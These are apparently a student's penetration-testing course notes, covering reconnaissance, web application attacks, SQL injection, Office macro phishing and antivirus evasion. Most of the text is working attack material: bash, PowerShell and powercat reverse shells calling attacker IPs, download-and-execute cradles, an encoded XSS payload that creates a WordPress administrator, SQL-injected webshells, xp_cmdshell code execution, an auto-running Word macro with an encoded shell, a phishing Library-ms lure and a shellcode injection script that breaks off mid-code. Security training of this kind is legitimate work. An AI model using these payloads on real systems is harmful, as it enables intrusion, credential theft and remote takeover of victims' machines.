ssh pattern for some machines
```
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52
```

## Info gathering
### Domain Registrar
```
whois offensive-security.com -h 192.168.210.251
```

## DNS enumeration

### DNS Recon
```
dnsrecon -d megacorpone.com -t std

dnsrecon -d megacorpone.com -D ~/list.txt -t brt
```
-t is the type of enumeration scan, in this case standard

### DNSEnum
```
dnsenum megacorpone.com
```

### Windows - nslookup
```
nslookup mail.megacorptwo.com

nslookup -type=TXT info.megacorptwo.com 192.168.50.151
```

## TCP / UDP Port Scanning

nc flags -> -u for udp, -w wait time, -z zero io

```
nc -nvv -w 1 -z 192.111.999.999 1-1999
nc -u -w 1 -z 192.111.999.999 1-1999
```

### Nmap

```
sudo nmap -sS $ip # stealth / syn scan
nmap -sT $ip # tcp connect scan
sudo nmap -sS -p 1-65535 $addr  2>/dev/null | grep open > ports.txt # scan all ports


nmap -sU $ip # udp scan

sudo nmap -sS -sU $ip # tcp + udp

# network sweeping
nmap -v -sn 192.168.50.1-253
nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt # output greppable format
nmap -v -p 80 -sn 192.168.50.1-253 # scan for port on range of networks


nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt  # TCP connect scan for top 20 points with OS version, scrpts, and traceroute -A
```

top 20 nmap ports are determined using the /usr/share/nmap/nmap-services file

```
sudo nmap -O $ip # os fingerprinting
sudo nmap -O $ip --os-scan-guess # force nmap to print os guess
```
can use script helpers for common cases

```
nmap --script http-headers $ip
nmap --script-help http-headers
```

### Windows Port Scans
```
Test-NetConnection -Port 445 192.168.50.151
# one-liner to scan ports
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null 
```

## SMB

Typically port 445, often goes hand-in-hand with NetBios (protocol on port 139 to help computers talk on LAN)

```
sudo nbtscan -r 192.168.50.0/24 # -r helps us enumerate through network

nmap -v -p 139,445 --scrpt smb-os-discovery $ip # use nmap script to enumerate smb
```

For windows, we can use `net view` to view all SMB shares

```
net view \\dc01 /all
```

## SMTP

VRFY root -> verifies email address
EXPN -> asks for membership in a mailing list

can use nc to run commands

```
nc -nv 192.168.50.8 25
VRFY root
VRFY idontexist
```

python script to run VRFY
`python3 smtp.py root 192.168.50.8`

```
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 3
        print("Usage: vrfy.py <username> <target_ip>")
        sys.exit(0)

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
ip = sys.argv[2]
connect = s.connect((ip,25))

# Receive the banner
banner = s.recv(1024)

print(banner)

# VRFY a user
user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)

print(result)

# Close the socket
s.close()
```

### Windows 
check if SMTP is up
```
Test-NetConnection -Port 25 192.168.50.8
```

we can install telnet on windows if have admin access
```
dism /online /Enable-Feature /FeatureName:TelnetClient
```
could also transfer it from another machine if pre-installed

once installed it's similar to nc

```
telnet 192.168.50.8 25
VRFY goofy
VRFY root
```

## SNMP
can use nmap
```
sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
```

alternatively use onesixtyone, need to load community strings into file
```
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
onesixtyone -c community -i ips`
```

query SNMP services with snmpwalk
-t timeout
-v1 version 1
```
snmpwalk -c public -v1 -t 10 192.168.50.151
```

```
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25
```

## Vulnerability scanning

### Nessus
installation

```
sudo apt install ./Nessus-10.5.0-debian10_amd64.deb
```
starting the service
```
sudo systemctl start nessusd.service
```

access on https://127.0.0.1:8834

### Nmap

can use scripts to automate
-sV -> service detection
"vuln" -> all the scripts in the category

```
sudo nmap -sV -p 443 --script "vuln" $ip
```

if we save a new script must update script db before executing
```
sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse
sudo nmap --script-updatedb
sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124
```

## Web Apps

### Nmap
```
sudo nmap -sV -p 80 $ip


sudo nmap -p 80 --script=http-enum $ip
```

### Wapplyzer
https://www.wappalyzer.com/



### Gobuster

-u target ip
-t thread count (default 10)
dir == dir mode, only enumerates files and dirs

```
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```

Note: don't forget about `robots.txt` and debugging page content when looking for clues!

## Api Brute Force
-p use a pattern file

```
echo {GOBUSTER}/v1 > pattern;
echo {GOBUSTER}/v2 >> pattern;
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```

-i flag for curl shows response headers
```
curl -i http://192.168.50.16:5002/users/v1
```

login with curl
-d = data
```
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```

can sometimes inject `admin: True` keys into request params
```
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
```

## Cross Site Scripting (XSS)
stored XSS -> inject exploit payload into db or cache
reflected -> malicious request link
### Cookies
Secure -> only send cookie over encrypted connection
HttpOnly -> deny JS access to cookies

JS code to grab nonce and create new admin user

```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

can use jscompress.com to minify JS payload 

afterwards we can encode it in utf-16 to make sure any invalid characters don't exist

charCodeAt -> converts to UTF-16

```
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

can then use the eval(String.fromCharCode) in the payload to decode the JS and execute it

```
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```

python2 pseudo-terminal
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Common Web App Attacks

### Directory Traversal

1. check for directory traversal
2. try to find private ssh keys
3. connect via ssh to shell

`/var/www/html` is typical linux web dir root

should check for ssh keys
```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

setting up ssh after stealing key
-i use this file
```
chmod 400 $dt_key
ssh -i dt_key -p 2222 offsec@mountaindesserts.com
```

linx -> /etc/passwd
windows -> C:\Windows\System32\drivers\etc\hosts
try both \ and / with file paths on windows

../ might be filtered by a firewall -> so we may want to encode the dots

### LFI

bash tcp reverse shell one liner

```
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```

risk with the above is that it could be using the bourne shell rather than bash
wrap it in bash -c to ensure no syntax errors

```
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```
```
Outside PHP, we can also leverage LFI and RFI vulnerabilities in other frameworks or server-side scripting languages including Perl,11 Active Server Pages Extended,12 Active Server Pages,13 and Java Server Pages
```

to check sudo privileges
```
sudo -l
```

### PHP Wrappers

can use a wrapper to see php source code.  often times anything with <?php> tags will get executed by the server. so we want the source code sent base64 encoded so that backend templating languages won't execute it.

#### php://filter 
basic filter -- won't always work for reasons above

```
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
```

base64 encoded option works better
```
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
echo -n $result | base64 -d
```
#### data://
let's us execute plain text. although sometimes firewalls will filter out php snippets so we need to encode

```
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

base64 encoded version 

```
echo -n echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

### RFI

`/usr/share/webshells/php/simple-backdoor.php` simple php webshell

start a python web server

```
python3 -m http.server 8080
```

## File Uploads
### Executable File Upload

can sometimes fool extension checker by using capital letters -> script.PhP

Powershell one liner for reverse shell

```
New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

Sequence for powershell reverse shell
1. open up pwsh
2. copy the one liner
3. encode the line
4. send it via curl

```
pwsh

$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

exit
```

powershell needs an enc parameter to specify encoding

```
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB
```

### Non-execution file upload

can attempt to overwrite authorized_keys for ssh

```
ssh-keygen
cat .ssh/id_rsa.pub > attack.pub
```

then upload to `../../../../root/.ssh/authorized_keys

sometimes have to remove known hosts file
```
rm ~/.ssh/known_hosts
```

### OS command injection

can use the -X flag with curl for POST requests

```
curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
```

can use `git version` to reveal OS

url-encoded semicolon is `%3B`

```
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
```

for windows, we need to check if it's running CMD or powershell

```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

we can url encode this and send


```
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
```

can use powercat for a windows reverse shell in pwsh

```
/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
nc -lnvp 4444
```

pwsh command for powercat reverse shell

```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```

encoded

```
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```

check `sudo su` to see if you can elevate to root shell

useful injections 

```

    &
    &&
    |
    ||
    ;
    \n
    `
    $()

```

## SQL Injection

### MySQL

```
mysql -u root -p'root' -h 192.168.50.16 -P 3306
select version();
select system_user();
show databases;
```

### MSSQL

can use impacket

```
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth


SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;
```

## Manual SQLi

### Using error payloads

example injection


```
offsec' OR 1=1 -- //
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
```
quick check is to append a special char liek an ' to username field to see if we get a SQL error message

can use the IN operator to execute queries

```
' or 1=1 in (select @@version) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

### UNION-based payloads
For UNION SQLi attacks to work, we first need to satisfy two conditions:
    1. The injected UNION query has to include the same number of columns as the original query.
    2. The data types need to be compatible between each column.

Need to know exact number of columns present. to discover this we can run:
```
' ORDER BY 1-- //
```

The above statement orders the results by a specific column, meaning it will fail whenever the selected column does not exist.

if we have 5 columns and a query like
```
select * from users where name LIKE cmd%
```

we can inject:

```
%' UNION SELECT database(), user(), @@version, null, null -- // database won't show up bc it's not an int
%' UNION SELECT null, database(), user(), @@version, null, null -- // better bc vals are all in string cols
```

can query information_schema table to find info on other tables
```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
' UNION SELECT null, username, password, description, null FROM users -- //
```

### Blind SQLi

out of band -- outside the web app

can do this via url enumeration
```
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- // boolean based
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- // time-based, will know if the user exists if the app hangs
```
look for a `?debug=true` option in source code

## Manual Code Execution

### MSSQL -- xp_cmdshell

first need to enable xp_cmdshell

```
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

can use SELECT INTO_OUTFILE for RCE
combined with php system command

```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

### Automated attacks

use sqlmap
-u url
-p parameter we want to test
```
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
```

can use the --dump param to dump database, creds, etc
--os-shell provides us with full interactive shell

```
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
```

-r use this file for the request
```
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```

when on a wordpress site, running `wpscan` with an api token is a good idea 

zip a file kali
```
zip x.zip pentestmonkey_reverse.php style.css
```

find all text files on a machine
```
find / -type f -name 'flag.txt' 2>/dev/null 1>hello
```

find all files with OS{ in them
```
find / -type f -name 'flag.txt' -exec grep -i "OS{" {} + 2>/dev/null 1>hello
```

10.3.2.6 Steps

1. found sqli on class form
2. used cast to get values from db via error message

```
weight=12&height=' and 1=cast((SELECT passwd FROM pg_shadow LIMIT 1 OFFSET 1) as int) and '1'='1' -- //&email=a%40a.com

pg_query(): Query failed: ERROR:  invalid input syntax for type integer: &quot;glovedb&quot; in <b>/var/www/html/class.php</b>

```
3. got password hash and tried cracking with md5 -- didn't work
```
weight=12&height=' and 1=cast((SELECT passwd FROM pg_shadow LIMIT 1 OFFSET 1) as int) and '1'='1' -- //&email=a%40a.com
```
4. decided to overwrite user's password instead
```
weight=12&height='; alter user rubben with password 'password' -- //&email=a%40a.com
```

5. used cve-2019-9193.py  (since we're on postgres) with new password. passed in reverse shell command

```
python3 cve-2019-9193.py -i 192.168.198.49 -d glovedb -U rubben -P password -c bash -c "bash -i >& /dev/tcp/192.168.45.202/4444 0>&1"
```


For windows IIS servers, we need to use gobuster with aspx extension and word list.  also disable errors

need to enable cmd_shell
`';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;


;EXEC master.dbo.xp_cmdshell 'powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.45.202/powercat.ps1\");powercat -c 192.168.45.202 -p 4444 -e powershell"';--+//&ctl00%24ContentPlaceHolder1%24PasswordTextBox=test&ctl00%24ContentPlaceHolder1%24LoginButton=Login

** Make sure to go back to root directory before running
Powershell command to recursively search for file

```
Get-ChildItem flag.txt -File -Recurse -ErrorAction SilentlyContinue
```

```
gobuster dir -u http://192.168.198.50 -x aspx -w aspx.txt --no-error
```

## Client-side attacks


### Info Gathering

can use 'exiftool' to investigate metadata on docs
-a display duplicate tags
-u display unknon tags

```
exiftool -a -u brochure.pdf
```

-x flag with gobuster searches for specific extensions
```
gobuster dir -u http://192.168.237.197 -x pdf -w /usr/share/dirb/wordlists/common.txt
```

### Client Fingerprinting

can use canarytokens with a link to get client info

### Exploiting MS Office

user must Enable Editing for the attack to take place

### Installing MS OFfice
need to use xfreerdp rather than rdesktop to have access

xfreerdp /u:offsec /p:password /v:192.168.20.20

### MS Office Macros

ActiveX Objects -> can access underlying operating system commands. achieved via wscript through windows host shell

```
Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```

need to add autoopen and document_open procedures to snsure run when opened

```
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```

can use powercat to get reverse shell
Dim -> var declaration
note that strings can only be 255 chars

powercat download and reverse shell command pre-base64 encoding

```
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```

python script to split up encoded poewrcat string

```
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')

```

finally we can finish our macro

```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```

then:
1. download powercat.exe onto local machine
2. start python server
3. start nc listening
4. wait for macro to execute

useful command copy string to clipboard xfreerdp
```
echo IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/payload") | Set-Clipboard
```

use impacket-smbserver to set up a share on kali to share files

```
impacket-smbserver share /home/kali/offsec/oscp -smb2support -user user -password password
```

then on windows connect to share

```
net use X: \\$ip\share /u:user password
```

### Windows Library Files

.Library-ms extension
payload in .lnk file
WebDav share -> allows uses to access and manage files on remote servers
use wsgidav to setup local http server, can confirm it's running by going to 127.0.0.1 in browser

```
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

example template https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@shell32.dll,-34575</name>
    <ownerSID>S-1-5-21-379071477-2495173225-776587366-1000</ownerSID>
    <version>1</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1002</iconReference>
    <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription publisher="Microsoft" product="Windows">
            <description>@shell32.dll,-34577</description>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <simpleLocation>
                <url>knownfolder:{FDD39AD0-238F-46AF-ADB4-6C85480369C7}</url>
                <serialized>MBAAAEAFCAAA...MFNVAAAAAA</serialized>
            </simpleLocation>
        </searchConnectorDescription>
        <searchConnectorDescription publisher="Microsoft" product="Windows">
            <description>@shell32.dll,-34579</description>
            <isDefaultNonOwnerSaveLocation>true</isDefaultNonOwnerSaveLocation>
            <simpleLocation>
                <url>knownfolder:{ED4824AF-DCE4-45A8-81E2-FC7965083634}</url>
                <serialized>MBAAAEAFCAAA...HJIfK9AAAAAA</serialized>
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
```

offsec version

isLibraryPinned -> is library pinned in windows explorer

iconReference -> which icon to use (imageres.dll, -1003 is an img icon)

folderType -> use Documents guid

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">

<name>@windows.storage.dll,-34582</name>
<version>6</version>

<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>

<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>

<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>

</libraryDescription>
```

easy way to send email


```
sendemail -f test@supermagicorg.com -xu test@supermagicorg.com -xp test -t dave.wizard@supermagicorg.com -u please open -m hello -s 192.168.210.199 -a config.Library-ms
```

don't forget to search txt,pdf files in gobuster

```
gobuster dir -u http://192.168.210.199 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x pdf,txt
```


## Online Exploit Resources

ExploitDb
Packet Storm -- Security News + Exploits

Metasploit
Core Impact
Canvas
BeEF


searchsploit update
```
sudo apt update && sudo apt install exploitdb
```

use -m flag with searchsploit to copy exploit into local dir
```
searchsploit -m windows/remote/48537.py
# Or
searchsploit -m 42031
```

use curl to url encode data and get reverse shell
```
curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=which nc"
curl http://192.168.194.11/project/uploads/users/830954-backdoor.php --data-urlencode cmd=nc -nv 192.168.45.235 6666 -e /bin/bash/
```

use nmap smb-share-enum script to get smb shares then smbclient to access
```
sudo nmap --script=smb-enum-shares 192.168.194.10
smbclient //192.168.194.10/offsec -c dir Downloads/*
```

msfvenom to generate reverse shell payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.235 LPORT=4444 -f exe > windows_reverse_shell.exe
```
cross-compiling windows exploits on kali
```
sudo apt install mingw-w64
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

using msfvenom for reverse shell
-f format
-e encoding
-b bad chars

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

use -k command with curl to not verify certs
```
curl -k https://192.168.214.45/uploads/shell.php?cmd=whoami
```

use metasploit to create a reverse shell

```
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.45.235
set LPORT 4444
exploit
```

meterpreter shell one-liner
```
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
```

## Antivirus Evasion

Use virustotal.com to check AV detection
https://antiscan.me allegedly doesn't send samples

### Thread injection

script to inject into ps process

```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]] $sc = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x5,0x68,0xc0,0xa8,0x32,0x1,0x68,0x2,0x0,0x1,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xc,0xff,0x4e,0x8,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x0,0x89,0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,0xc7,0x44,0x24,0x3c,0x1,0x1,0x8d,0x44,0x24,0x10,0xc6,0x0,0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,0x46,0xff,0x30,0x68,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

